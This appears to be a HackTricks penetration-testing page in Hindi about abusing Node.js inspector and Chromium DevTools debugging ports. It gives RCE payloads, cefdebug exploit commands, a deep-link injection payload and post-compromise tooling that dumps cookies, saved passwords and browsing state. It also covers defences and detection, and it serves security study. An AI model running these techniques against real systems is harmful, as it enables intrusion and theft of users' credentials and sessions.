# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

ऐतिहासिक व्यावहारिक उदाहरणों में Multimaster walkthrough और CVE-2019-1414 Visual Studio Code debugger attack शामिल हैं; इन्हें version-specific संदर्भ के रूप में इस्तेमाल करें, न कि यह मानकर कि हर मौजूदा Electron या Chromium target में समान primitives उपलब्ध हैं।<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[दस्तावेज़ों से](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch के साथ शुरू किए जाने पर, Node.js process debugging client के लिए सुनता है। **डिफ़ॉल्ट रूप से**, यह host और port **`127.0.0.1:9229`** पर सुनता है। हर process को एक **अद्वितीय** **UUID** भी दिया जाता है।<sup>[[4]](#references)</sup>

कनेक्ट करने के लिए inspector clients को host address, port और UUID जानना और निर्दिष्ट करना होगा। पूरा URL कुछ इस तरह दिखेगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।<sup>[[4]](#references)</sup>

> [!WARNING]
> चूँकि **debugger को Node.js execution environment का पूरा access होता है**, इसलिए इस port से कनेक्ट कर सकने वाला malicious actor, Node.js process की ओर से arbitrary code execute कर सकता है (**संभावित privilege escalation**)।<sup>[[4]](#references)</sup>

Inspector शुरू करने के कई तरीके हैं:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

जब आप किसी निरीक्षणाधीन process को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF** (**Chromium Embedded Framework**) पर आधारित processes `--remote-debugging-port=9222` के साथ debugger उपलब्ध करा सकते हैं। इससे browser, Node.js inspector के बजाय [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के ज़रिए उपलब्ध होता है, इसलिए Node.js `process`-आधारित payloads डिफ़ॉल्ट रूप से सीधे लागू नहीं होते।<sup>[[2]](#references)[[5]](#references)</sup>

जब आप debug mode में browser शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint की गणना करना और उसे संचालित करना

HTTP discovery endpoints **browser** WebSocket को अलग-अलग **target** (tab, worker, extension आदि) WebSockets से अलग पहचानते हैं। Browser endpoint के लिए `/json/version` और targets के लिए `/json/list` को query करें; इसके बाद लौटाए गए `webSocketDebuggerUrl` मानों को CDP के JSON-RPC-जैसे messages से सीधे संचालित किया जा सकता है।<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

उदाहरण के लिए, `websocat "$BROWSER_WS"` से कनेक्ट करें और `{"id":1,"method":"Target.getTargets"}` या `{"id":2,"method":"Storage.getCookies"}` भेजें। किसी page target (`websocat "$PAGE_WS"`) पर, `Runtime.evaluate` उस renderer में execute होता है और `Page.captureScreenshot` base64-encoded screenshot लौटाता है। `document.cookie`, `HttpOnly` cookies को उजागर नहीं कर सकता, जबकि `Storage.getCookies` browser से उसका cookie store माँगता है।<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browsers, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेबसाइटें web-browser में खुलने पर browser security model के तहत WebSocket और HTTP requests कर सकती हैं। **एक शुरुआती HTTP connection** **एक unique debugger session id प्राप्त करने** के लिए आवश्यक है। **same-origin-policy** वेबसाइटों को **यह HTTP connection बनाने से रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)** से अतिरिक्त सुरक्षा के लिए,** Node.js यह सुनिश्चित करता है कि connection के **'Host' headers** में या तो **IP address** हो या ठीक-ठीक **`localhost`** निर्दिष्ट हो।<sup>[[4]](#references)</sup>

> [!TIP]
> **यह security measure सिर्फ़ एक HTTP request भेजकर (जो SSRF vuln का फायदा उठाकर किया जा सकता है) code चलाने के लिए inspector का शोषण करने से रोकता है।**<sup>[[4]](#references)</sup>

### चल रही processes में inspector शुरू करना

आप किसी चल रही nodejs process को **signal SIGUSR1** भेजकर उसे default port पर **inspector शुरू करने** के लिए कह सकते हैं। हालांकि, ध्यान दें कि आपके पास पर्याप्त privileges होने चाहिए। इससे आपको **process के अंदर की जानकारी तक privileged access** मिल सकता है, लेकिन सीधे privilege escalation नहीं।<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> यह containers में उपयोगी है क्योंकि **process को बंद करना और `--inspect` के साथ नया process शुरू करना** एक विकल्प **नहीं** है, क्योंकि process के साथ **container** भी **बंद कर दिया जाएगा**।<sup>[[6]](#references)</sup>

### inspector/debugger से कनेक्ट करें

**Chromium-based browser** से कनेक्ट करने के लिए, Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs खोले जा सकते हैं। Configure बटन पर क्लिक करके यह सुनिश्चित करना चाहिए कि **target host और port** सही ढंग से सूचीबद्ध हैं। चित्र में Remote Code Execution (RCE) का एक उदाहरण दिखाया गया है:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger तक पहुँचने के लिए एक URL दिखाई देगा। उदाहरण के लिए ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से कनेक्ट करें: Chromium-based browser से कनेक्ट करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से कनेक्ट कर सकते हैं:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

टूल [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) **स्थानीय रूप से चल रहे inspectors को खोजने** और उनमें **code inject करने** की अनुमति देता है।<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के ज़रिए browser से connected होने पर **NodeJS RCE exploits काम नहीं करेंगे** (इसके साथ करने के लिए दिलचस्प चीज़ें खोजने हेतु आपको API देखनी होगी)।<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> अगर आप यह जानने आए हैं कि [**Electron में XSS से RCE कैसे प्राप्त करें, तो कृपया यह पेज देखें।**](../../desktop-application-security/electron-desktop-apps/index.html)

जब आप किसी Node **inspector** से **connect** कर सकते हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके ये हैं (ऐसा लगता है कि **Chrome DevTools protocol से connection होने पर यह काम नहीं करेगा**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
इस section में मैं उन दिलचस्प तरीकों की सूची दूँगा जिनका उपयोग लोगों ने इस protocol का exploit करने के लिए किया है।

### Chrome 136+ में default-profile प्रतिबंध

**Chrome 136** से, Chrome `--remote-debugging-port` और `--remote-debugging-pipe` को तब अनदेखा करता है, जब वे **default Chrome data directory** को target करते हैं। इस switch के साथ एक non-standard `--user-data-dir` देना ज़रूरी है। इसकी अलग encryption key और isolated browser state के कारण, केवल flag पर आधारित यह आसान technique उपयोगकर्ता की सामान्य authenticated profile को expose नहीं कर सकती। बिना पुष्टि किए यह नहीं मानना चाहिए कि Chrome का यह विशिष्ट प्रतिबंध पुराने Chrome builds, Chrome for Testing, Electron/CEF applications या Chromium के अन्य derivatives पर भी लागू होता है।<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

इसलिए, केवल `--remote-debugging-port` के साथ लॉन्च हुई मौजूदा Chrome process को देखकर यह **साबित नहीं होता** कि CDP सक्रिय हुआ। Listener और `/json/version` की पुष्टि करें, और पता लगाएँ कि वास्तव में कौन-सा profile इसे चला रहा है।<sup>[[14]](#references)</sup>

### Deep Links के ज़रिए Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino security ने पता लगाया कि CEF पर आधारित एक application ने system में एक custom URI (`workspaces://index.html`) **register** किया था। यह पूरा URI प्राप्त करता था और फिर उस URI से आंशिक रूप से बनाई गई configuration के साथ CEF-आधारित application **launch** करता था।<sup>[[8]](#references)</sup>

पता चला कि URI parameters को URL decode करके CEF-आधारित application launch करने के लिए इस्तेमाल किया जाता था, जिससे user **command line** में **`--gpu-launcher`** flag **inject** करके arbitrary चीज़ें execute कर सकता था।<sup>[[8]](#references)</sup>

इसलिए, ऐसा payload:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe निष्पादित करेगा।<sup>[[8]](#references)</sup>

### फ़ाइलें ओवरराइट करें

वह फ़ोल्डर बदलें जहाँ **downloaded files सहेजी जाएँगी** और **malicious code** वाली फ़ाइल डाउनलोड करके एप्लिकेशन के अक्सर इस्तेमाल होने वाले **source code** को **overwrite** करें।<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE और exfiltration

STAR Labs ने दिखाया कि exposed WebDriver/CDP services से arbitrary file reads और RCE संभव हो सकते हैं; कुछ configurations में DNS rebinding से exploit chain पूरी हो सकती है।<sup>[[9]](#references)</sup>

ChromeDriver की WebDriver service, Chrome DevTools/CDP से अलग है। इसकी [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) नए session के लिए लॉन्च किए जाने वाले browser executable को चुनती है। यदि कोई unprivileged caller root के रूप में चल रही ChromeDriver service तक पहुँच सकता है और caller-controlled executable path वाला session submit कर सकता है, तो यह launch service की privilege boundary को पार कर सकता है। खाली `/sessions` response से यह तय नहीं होता कि नए sessions बनाए जा सकते हैं या नहीं। इस path के उपयोग योग्य होने का निष्कर्ष निकालने से पहले process owner, listener की वास्तविक पहुँच, session authorization, executable access और confinement की जाँच करें; केवल process name या आमतौर पर इस्तेमाल होने वाला port पर्याप्त नहीं है। [Google की security guidance](https://developer.chrome.com/docs/chromedriver/security-considerations) के अनुसार ChromeDriver को unprivileged account के तहत चलाएँ। Passive enumeration में WebDriver session नहीं बनाना चाहिए।

Browser automation और Chromium security के अतिरिक्त ऐतिहासिक मामलों के लिए, Counter WebDriver write-up और Project Zero issues 773, 1742 और 1944 देखें।<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### चल रहे Chromium process के अंदर CDP सक्षम करना

Chrome की default-profile restriction केवल command-line activation path को block करती है। Browser process में बदलाव करने के लिए पर्याप्त same-user access होने पर, मूल [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) और Cobalt Strike का [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF), पहले से चल रहे `chrome.exe` या `msedge.exe` के अंदर Chromium के non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` को invoke करते हैं। इसलिए endpoint असली profile का होता है और उसके tabs, extensions, cookies तथा authenticated state बरकरार रहते हैं।<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

आम x64 Chrome/Edge processes के लिए, BOF browser window और loaded `chrome.dll`/`msedge.dll` ढूँढ़ता है, masked signatures के लिए remote PE को scan करता है, stubs और context block allocate करता है, window procedure को अस्थायी रूप से replace करता है और अंतिम call को browser के **UI thread** पर dispatch करता है। ज़रूरी runtime inputs हैं: `StartRemoteDebuggingServer`, Chromium का `operator new`, `TCPServerSocketFactory::CreateForHttpServer` और factory vtable। हर अनिवार्य signature का unique match मिलने पर ही execution आगे बढ़ता है।<sup>[[15]](#references)[[16]](#references)</sup>

BOF browser mode और optional port स्वीकार करता है। इसके बाद इसकी helper script endpoint को verify कर सकती है और cookies collect कर सकती है; Chrome की Windows Process Isolation boundary के लिए `chrome-iso` एक अलग path है।<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` path में isolated process के लिए केवल query-limited handles का उपयोग होता है। यह उस installed `chrome.dll` की पहचान करता है जिसका PE image size live process से मेल खाता है, उस local image से symbols resolve करता है, और UI thread तक पहुँचने के लिए Chromium के `WindowImpl` dispatch के साथ synchronous `WM_COPYDATA` और मौजूदा image में मौजूद User32 hook का उपयोग करता है।<sup>[[16]](#references)</sup>

> [!WARNING]
> यह **compromise के बाद browser-process manipulation** तकनीक है, unauthenticated network bypass नहीं। यह build-dependent है, क्योंकि संबंधित C++ symbols export नहीं किए जाते और browser updates के बाद बदल सकते हैं।<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Browser updates के बाद signatures को refresh करना

Target पर installed `chrome.dll` या `msedge.dll` का exact version और उससे मेल खाने वाला PDB इस्तेमाल करें। Windows SDK का `symchk.exe` symbols डाउनलोड करता है; इसके बाद repository scripts `StartRemoteDebuggingServer` ढूँढ़ती हैं, allocator/socket-factory inputs निर्धारित करती हैं, या BOF में embedded हर signature को validate करती हैं।<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Zero-hit या multi-hit परिणाम को किसी मनमाने address से नहीं बदलना चाहिए। यदि कोई ज्ञात `operator new` या `CreateForHttpServer` pattern इतना बदल गया हो कि उससे नया mask तैयार न किया जा सके, तो उस symbol की जाँच करने और ऐसा byte sequence निकालने के लिए PDB के साथ `pe_signature_finder.py` का उपयोग करें जो target module में अद्वितीय हो।<sup>[[16]](#references)[[18]](#references)</sup>

#### CDP Toolkit से authenticated-browser extraction

यह तकनीक App-Bound Encryption (ABE) को offline decrypt नहीं करती और न ही device binding हटाती है। इसके बजाय, यह वैध browser को **decryption oracle और authenticated interaction proxy** के रूप में इस्तेमाल करती है: `Storage.getCookies` live browser से उसका cookie store माँगता है, जबकि navigation/screencast workflows requests, storage, enterprise authentication और device-bound behavior को पीड़ित के मौजूदा browser के भीतर ही बनाए रखते हैं।<sup>[[17]](#references)[[18]](#references)</sup>

Loopback CDP listener को operator के pivot के माध्यम से route करने के बाद, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) सामान्य artifacts की गणना और संग्रह कर सकता है।<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump`, और `tabs screenshot` ज़्यादातर `/json/version`, target list, `Storage.getCookies`, और `Page.captureScreenshot` के wrappers हैं। History, bookmarks, extensions और password metadata के लिए इसके बजाय एक अस्थायी `chrome://`/`edge://` WebUI target चाहिए: toolkit surface के render होने का इंतज़ार करता है, उसके model या DOM की जाँच करता है, परिणाम इकट्ठा करता है और target बंद कर देता है।<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` इससे आगे जाता है: यह असली saved-login origin खोलता है, credential field पर focus करता है, CDP input events का उपयोग करके native autofill suggestion चुनता है और भरी हुई values पढ़ता है। Origin/port/path का saved-password realm से क़रीबी मेल होना चाहिए; visible mode भरोसेमंद default है, क्योंकि suggestion popup native browser UI है।<sup>[[17]](#references)[[18]](#references)</sup>

Live interaction के लिए, `browser-takeover screencast` frames stream करता है और किसी असली target को input भेजता है (background या off-screen modes समेत)। इसके बजाय `browser-takeover proxy` स्थानीय रूप से HTTP और HTTPS `CONNECT` स्वीकार करता है और hidden Chrome targets के ज़रिए upstream requests करता है; जहाँ hidden targets उपलब्ध नहीं होते, वहाँ background tabs का उपयोग करता है। इससे victim का network/authentication context बना रहता है, लेकिन complex client-side applications के लिए यह कम सटीक है, क्योंकि operator browser लौटाए गए content को render करता है।<sup>[[17]](#references)[[18]](#references)</sup>

Detection के लिए, केवल `--remote-debugging-*` command-line telemetry पर निर्भर न रहें: browser processes के विरुद्ध असामान्य handles और memory operations (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, और Chrome/Edge के स्वामित्व वाले अप्रत्याशित loopback listening sockets का भी correlation करें।<sup>[[15]](#references)</sup>

### Post-Exploitation

वास्तविक environment में और किसी ऐसे user PC को **compromise करने के बाद** जो Chromium-based browser इस्तेमाल करता हो, एक ऐतिहासिक technique browser को debugging enabled करके दोबारा launch करना और loopback port को forward करना थी। इससे उन products/builds पर victim की browsing state उजागर हो सकती है जो अब भी चुनी हुई profile स्वीकार करते हैं, लेकिन Chrome 136+ के default data directory पर यह तरीका काम नहीं करेगा।<sup>[[7]](#references)[[14]](#references)</sup>

पुराने/version-specific targets के लिए मूल relaunch command नीचे ज्यों का त्यों दिया गया है। दूसरा command, current Chrome के लिए समर्थित तरीका है, लेकिन यह victim की सामान्य authenticated state को फिर से खोलने के बजाय एक isolated profile बनाता है।<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS-विशिष्ट Chromium relaunch, extension और CDP tradecraft के लिए, [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md) देखें।



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger निरीक्षण और exploitation टूल](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger के ज़रिए Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - शुरुआत करना](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: दूर से Browsing Sessions देखने और नियंत्रित करने के लिए Chrome के Debugging Feature का दुरुपयोग](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding और CDP के ज़रिए WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot से RCE तक](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [सुरक्षा बेहतर बनाने के लिए remote debugging switches में बदलाव - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [चल रहे Edge Browser में CDP inject करना: Runtime Browser Instrumentation की गहराई से पड़ताल](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster की वापसी](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
